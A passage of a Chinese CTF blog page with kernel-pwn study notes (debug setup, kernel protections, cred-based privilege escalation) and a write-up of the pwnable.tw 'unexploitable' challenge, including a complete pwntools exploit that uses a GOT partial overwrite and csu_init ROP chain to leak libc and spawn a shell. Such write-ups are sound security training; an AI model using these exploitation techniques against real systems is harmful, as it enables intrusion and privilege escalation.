                <time title="Modified: 2021-04-01 20:38:12" itemprop="dateModified" datetime="2021-04-01T20:38:12+08:00">2021-04-01</time>
              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><p>内核的漏洞类型</p>
<p><img src="/2020/10/27/Linux-pwn/20200417101602-627016cc-8051-1.png" alt="img"></p>
<h2 id="init-sh中的一些命令"><a href="#init-sh中的一些命令" class="headerlink" title="init.sh中的一些命令"></a>init.sh中的一些命令</h2><p>cpio命令：用于备份Linux文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cpio - copy files to and from archives</span></span><br><span class="line">cpio  &#123;-o|--create&#125; [-0acvABLV] [-C bytes] [-H format] [-M message] [-O [[user@]host:]archive] [-F [[user@]host:]archive] [--file=[[user@]host:]archive] [--format=format] [--message=mes‐</span><br><span class="line">       sage] [--null] [--reset-access-time] [--verbose] [--dot] [--append] [--block-size=blocks] [--dereference] [--io-size=bytes]  [--quiet]  [--force-local]  [--rsh-command=<span class="built_in">command</span>]  [--<span class="built_in">help</span>]</span><br><span class="line">       [--version] &lt; name-list [&gt; archive]</span><br></pre></td></tr></table></figure>
<p>mount    </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mount - mount a filesystem</span></span><br><span class="line">mount -t <span class="built_in">type</span> device dir</span><br></pre></td></tr></table></figure>
<p>chrown</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chown - change file owner and group</span></span><br><span class="line"><span class="comment"># chown changes the user and/or group ownership of each given file.</span></span><br><span class="line">chown [OPTION]... [OWNER][:[GROUP]] FILE...</span><br><span class="line">chown [OPTION]... --reference=RFILE FILE...</span><br></pre></td></tr></table></figure>
<p>setsid, setuidgid</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setsid [options] program [arguments]</span></span><br><span class="line"><span class="comment"># setsid runs a program in a new session.</span></span><br><span class="line">setsid [options] program [arguments]</span><br><span class="line"></span><br><span class="line"><span class="comment"># setgid() sets the effective group ID of the calling process.</span></span><br><span class="line"><span class="comment"># setuid()  sets  the  effective user ID of the calling process.</span></span><br></pre></td></tr></table></figure>
<h2 id="调试的链接过程"><a href="#调试的链接过程" class="headerlink" title="调试的链接过程"></a>调试的链接过程</h2><p>bzImage是</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../linux-4.9/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker容器中貌似不支持虚拟化不能用kvm，将-enable-kvm选项去掉</span></span><br><span class="line"><span class="comment"># 这个命令一般在题目中会被给出来</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M \</span><br><span class="line">--nographic  -smp cores=1,threads=1 -cpu kvm64,+smep \</span><br><span class="line">-gdb tcp::1234</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb </span><br><span class="line">-&gt;<span class="built_in">set</span> architecture ...</span><br><span class="line">-&gt;target remote :1234</span><br><span class="line">-&gt;add-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc00000</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/babydriver/sections/.text</span><br><span class="line"><span class="comment"># 得到0xffffffffc00000 这个就是babydriver驱动的.txt的起始地址</span></span><br></pre></td></tr></table></figure>
<p>也可以通过以下命令输出所有的字符以及对应的地址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms </span><br><span class="line"><span class="comment"># /proc/kallsyms 给出内核中所有 symbol 的地址</span></span><br><span class="line"><span class="comment"># 我们需要这个信息来写可靠的 exploit，否则需要自己去泄露这个信息。</span></span><br><span class="line"><span class="comment"># 在低版本的内核中所有用户都可读取其中的内容，高版本的内核中缺少权限的用户读取时会返回 0。</span></span><br></pre></td></tr></table></figure>
<p>在调试的过程中直接修改uid可能会造成环境出现差别，所以要在文件系统的启动脚本中<code>/etc/init.d/rsC</code>或者<code>/init</code>中添加<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>将符号信息保存下来，供之后 调试使用。</p>
<h2 id="kernel-pwn-的目标"><a href="#kernel-pwn-的目标" class="headerlink" title="kernel pwn 的目标"></a>kernel pwn 的目标</h2><p>Kernel Pwn 就是找出内核模块中的漏洞，然后写一个 C 语言程序，放入文件系统中打包，重新运行取来，此时用户一般都是普通用户，运行程序调用此模块的功能利用漏洞，从而提升权限到 root 用户，读取 flag。</p>
<h2 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h2><p>动态可加载模块Loadable Kernel Module</p>
<p>可以往 Kernel 中接入各种 LKM，也可以卸载，常见的外设驱动就是一个 LKM</p>
<p>LKM 文件与用户态的可执行文件一样，在 Linux 中就是 ELF 文件，可以利用 IDA 进行分析</p>
<p>LKM 是单独编译的，但是不能单独运行，他只能作为 OS Kernel 的一部分</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">insmod <span class="comment"># 接入指定模块</span></span><br><span class="line">rmmod <span class="comment"># 删除置顶模块</span></span><br><span class="line">lsmod <span class="comment"># 列出指定模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># insmod - Simple program to insert a module into the Linux Kernel</span></span><br><span class="line"><span class="comment"># insmod is a trivial program to insert a module into the kernel.</span></span><br><span class="line">insmod [filename] [module options...]</span><br></pre></td></tr></table></figure>
<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>ioctl 是设备驱动程序中对设备的 I/O 通道进行管理的函数</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">fd 是文件标示符</span></span><br><span class="line"><span class="comment">cmd 用户对于设备的控制命令</span></span><br><span class="line"><span class="comment">... 和cmd的意义有关</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">int ioctl(int fd, ind cmd, …)；</span><br></pre></td></tr></table></figure>
<p><strong>如果一个 LKM 中提供了 iotcl 功能，并且实现了对应指令的操作，那么在用户态中，通过这个驱动程序，我们可以调用 ioctl 来直接调用模块中的操作。</strong></p>
<h2 id="内核态的保护模式"><a href="#内核态的保护模式" class="headerlink" title="内核态的保护模式"></a>内核态的保护模式</h2><p>常见的保护机制</p>
<ul>
<li><code>KPTI</code>：Kernel PageTable Isolation，内核页表隔离</li>
<li><code>KASLR</code>：Kernel Address space layout randomization，内核地址空间布局随机化</li>
<li><code>SMEP</code>：Supervisor Mode Execution Prevention，管理模式执行保护</li>
<li><code>SMAP</code>：Supervisor Mode Access Prevention，管理模式访问保护</li>
<li><code>Stack Protector</code>：Stack Protector又名canary，stack cookie</li>
<li><code>kptr_restrict</code>：允许查看内核函数地址</li>
<li><code>dmesg_restrict</code>：允许查看<code>printk</code>函数输出，用<code>dmesg</code>命令来查看</li>
<li><code>MMAP_MIN_ADDR</code>：不允许申请<code>NULL</code>地址 <code>mmap(0,....)</code></li>
</ul>
<p><code>KASLR</code>、<code>Stack Protector</code>与用户态下的<code>ASLR</code>、<code>canary</code>保护机制相似。</p>
<h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>相当于alsr开启后地址空间进行随机化布局。</p>
<p>内核地址空间布局随机化，并不默认开启，需要在内核命令行中添加指定指令。</p>
<p>qemu 增加启动参数 -append “kaslr” 即可开启</p>
<h3 id="Stack-Protector"><a href="#Stack-Protector" class="headerlink" title="Stack Protector"></a>Stack Protector</h3><p>相当于开启了canary，对栈上的地址进行保护。</p>
<h3 id="MMAP-MIN-ADDR"><a href="#MMAP-MIN-ADDR" class="headerlink" title="MMAP_MIN_ADDR"></a>MMAP_MIN_ADDR</h3><p>保护机制不允许程序分配低内存地址</p>
<h3 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h3><p>管理模式执行保护，保护内核是其不允许执行用户空间代码。</p>
<p>操作系统是通过 CR4 寄存器的第 20 位的值来判断 SMEP 是否开启，1 开启，0 关闭，检查 SMEP 是否开启，可通过 mov 指令给 CR4 寄存器赋值从而达到关闭 SMEP 的目的，相关的 mov 指令可以通过 ropper，ROPgadget 等工具查找。</p>
<p><img src="/2020/10/27/Linux-pwn/20200417101603-6364755a-8051-1.png" alt="img"></p>
<h3 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h3><p>管理模式访问保护，禁止内核访问用户空间的数据</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
<li><p>内核态调用commit_creds(prepare_kernel_cred(0))，返回用户态执行shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改cred结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ol>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/26/bytectf-gun/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/10/26/bytectf-gun/" class="post-title-link" itemprop="url">bytectf-gun</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-10-26 19:57:46" itemprop="dateCreated datePublished" datetime="2020-10-26T19:57:46+08:00">2020-10-26</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-12-07 22:55:12" itemprop="dateModified" datetime="2020-12-07T22:55:12+08:00">2020-12-07</time>
              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>由于程序作了一些处理导致没法正常载入libc中的一些函数，阅读起来可能有些困难。</p>
<p>首先程序进行了沙箱的保护，只保留了open，read和write函数能够调用<img src="../../../../Library/Application Support/typora-user-images/截屏2020-10-26 下午8.06.35.png" alt="截屏2020-10-26 下午8.06.35" style="zoom:50%;"></p>
<p>程序的装置记录方式</p>
<p>程序有三个函数</p>
<ol>
<li><p>shoot函数用来一次性释放掉所有的子弹（释放chunk）</p>
</li>
<li><p>load函数可以将申请到的子弹装入弹夹（将申请到的chunk链入要进行释放的地址之中）</p>
</li>
<li><p>buy用来申请到一块空间</p>
</li>
</ol>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/23/unexploitable/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/10/23/unexploitable/" class="post-title-link" itemprop="url">unexploitable</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-10-23 15:16:56 / Modified: 15:47:59" itemprop="dateCreated datePublished" datetime="2020-10-23T15:16:56+08:00">2020-10-23</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/网络安全/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a></span>

                
                
              
            </span>
          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>利用ida打开程序会发现如下的情况：</p>
<p><img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.18.40.png" alt="截屏2020-10-23 下午3.18.40" style="zoom:50%;"></p>
<p>主函数有个read函数有个溢出，看了程序的got表发现程序只有read函数并没有输出。</p>
<p><img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.18.47.png" alt="截屏2020-10-23 下午3.18.47" style="zoom:50%;"></p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>考虑修改got表的中read地址的低字节，使它指向一个syscall地址。</p>
<p>我们先read在libc中的偏移是0xf6670，然后用ropper搜索libc中的syscall：<img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.27.34.png" alt="截屏2020-10-23 下午3.27.34" style="zoom:50%;"></p>
<p>可以找到两个和read只有最低一字节不同的syscall的地址，这里我们选用0xf667e来进行利用。</p>
<p>我们有read函数因此可以从里面向内存中写入数据。用ROPgadget搜索其中的结果<img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.30.55.png" alt="截屏2020-10-23 下午3.30.55"></p>
<p>没有可以利用的rop地址，由于不知道libc的基址因此没办法在libc中寻找rop，此时就考虑利用csu_init。<img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.33.52.png" alt="截屏2020-10-23 下午3.33.52" style="zoom:50%;"></p>
<p>通过csu_init我们可以设置rdi，rsi，rdx的值，并且可以跳转到指定函数。</p>
<p>下面就是具体的利用思路了：</p>
<ol>
<li>现修改got表中read的最后一个字节为0x7e，使之指向syscall</li>
<li>由于上一步中只读了一个字节rax返回1，所以记下来再次调用got[‘read’]就会系统调用write。利用此将got表中的地址显示，泄漏出libc的地址</li>
<li>返回main函数，由于main函数调用read时rax会清0，所以现在当got表中的read指向syscall时也会系统调用read。这样覆盖栈的返回地址为onegadget就能获得shell（注意由于我选onegadget需要rsp+30为0，所以栈溢出的时候多向写写几个0使其满足条件）</li>
</ol>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x00000000000f667e: syscall; cmp rax, -0xfff; jae 0xf66b9; ret;</span></span><br><span class="line"><span class="string">'0xf6670'</span></span><br><span class="line"><span class="string">通过read构造rax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./unexploitable'</span>)</span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10403</span>)</span><br><span class="line"><span class="comment"># p = process('./unexploitable')</span></span><br><span class="line"><span class="comment"># cmd = 'b *0x4005D9\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b *0x400571\n'</span></span><br><span class="line"><span class="comment"># gdb.attach(p, cmd)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x4005E6</span></span><br><span class="line">csu2 = <span class="number">0x4005D0</span></span><br><span class="line">main = <span class="number">0x400544</span></span><br><span class="line">rg = elf.got[<span class="string">'read'</span>]</span><br><span class="line">print(hex(rg))</span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">b'a'</span>+p64(csu1)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">8</span> + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">0x1</span>)+p64(csu2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">8</span> + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>) + \</span><br><span class="line">    p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">0x20</span>)+p64(csu2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># back to read</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">0x38</span>+p64(main)</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b'\x7e'</span>)</span><br><span class="line">libc = u64(p.recvn(<span class="number">8</span>))<span class="number">-0xf667e</span></span><br><span class="line">print(<span class="string">'libc'</span>,hex(libc))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">b'a'</span>+p64(libc+<span class="number">0x4526a</span>)</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">xkaneiki</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">20</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">14</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          

          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lyyl.online" title="https://www.lyyl.online" rel="noopener" target="_blank">LYYL</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://n1k0ooo.github.io/" title="https://n1k0ooo.github.io/" rel="noopener" target="_blank">N1K0_</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://a1ex.online" title="https://a1ex.online" rel="noopener" target="_blank">A1ex</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xkaneiki</span>

  

  
</div>


